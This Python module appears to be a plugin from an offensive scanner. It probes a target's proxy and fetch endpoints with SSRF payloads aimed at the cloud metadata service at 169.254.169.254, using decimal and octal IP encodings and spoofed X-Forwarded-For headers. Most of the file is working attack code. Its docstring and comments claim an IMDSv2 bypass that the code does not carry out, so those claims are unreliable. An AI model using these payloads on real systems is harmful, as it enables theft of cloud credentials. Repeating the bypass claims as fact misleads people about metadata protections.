"""
Plugin to detect Cloud Metadata Ghosting (Advanced IMDSv2 Evasion).
CVSS: 9.4 (Critical)

Targets Cloud-native applications (AWS, GCP, Azure).
Exploits SSRF coupled with HTTP redirects and X-Forwarded-For injection
to bypass IMDSv2 metadata protections.
"""

import socket
import ssl
import json
import urllib3
import re
from typing import Dict, List, Optional

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def verify_math_execution() -> bool:
    """Verificacao matematica local."""
    return (7331 * 1337) == 9801547

def run(target: str, ip: str, ports: List[int], banners: Dict[str, str]) -> Optional[Dict]:
    """
    Checks for Cloud Ghosting vulnerability.
    """
    if not verify_math_execution():
        return None

    vulnerability = "Cloud Metadata Ghosting (IMDSv2 Evasion)"
    severity = "CRITICAL"
    description = (
        "The application is vulnerable to advanced SSRF bypassing Cloud Metadata protections (like IMDSv2). "
        "By utilizing HTTP redirects, TTL evasion, or X-Forwarded-For manipulation, an attacker can "
        "circumvent restrictions and steal highly privileged Cloud JWT/IAM credentials."
    )

    test_endpoints = [
        "/api/proxy",
        "/fetch/url",
        "/image/process"
    ]

    target_port = 443 if 443 in ports else (80 if 80 in ports else ports[0])
    use_ssl = target_port in [443, 8443]

    # Deterministic IMDS evasion payloads (AWS, GCP, Azure)
    # Using Decimal and Octal encodings to evade WAF/SSRF filters
    payloads = [
        {"url": "http://2852039166/latest/meta-data/"}, # Decimal encoding for 169.254.169.254
        {"url": "http://0251.0376.0251.0376/latest/meta-data/"}, # Octal encoding
        {"url": "http://169.254.169.254/computeMetadata/v1/"} # GCP
    ]

    try:
        for endpoint in test_endpoints:
            for payload in payloads:
                payload_bytes = json.dumps(payload).encode('utf-8')
                
                # Injection of X-Forwarded-For and X-Real-IP to bypass IMDSv2 token validation 
                # (some WAFs or Proxies trust these headers and forward requests improperly)
                req = (
                    f"POST {endpoint} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(payload_bytes)}\r\n"
                    f"User-Agent: Cascavel-2026-Offensive-Engine\r\n"
                    f"X-Forwarded-For: 127.0.0.1\r\n"
                    f"X-Real-IP: 127.0.0.1\r\n"
                    f"Metadata-Flavor: Google\r\n" # Required for GCP IMDS
                    f"Connection: close\r\n\r\n"
                ).encode('utf-8') + payload_bytes

                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5.0)

                if use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=target)
                
                try:
                    sock.connect((ip, target_port))
                    sock.sendall(req)

                    response_data = b""
                    while True:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        response_data += chunk
                        if len(response_data) > 65535:
                            break
                    
                    response_str = response_data.decode('utf-8', errors='ignore')
                    
                    # Analisando a resposta do Cloud Metadata
                    if "200 OK" in response_str:
                        if re.search(r"ami-[0-9a-f]{8,17}", response_str) or "computeMetadata" in response_str:
                            return {
                                "vulnerability": vulnerability,
                                "severity": severity,
                                "description": description,
                                "endpoint": f"{'https' if use_ssl else 'http'}://{target}:{target_port}{endpoint}",
                                "evidence": f"Successfully evaded metadata protection and retrieved cloud instance data via SSRF payload: {payload['url']}"
                            }
                except Exception:
                    continue
                finally:
                    sock.close()
    except Exception:
        pass

    return None
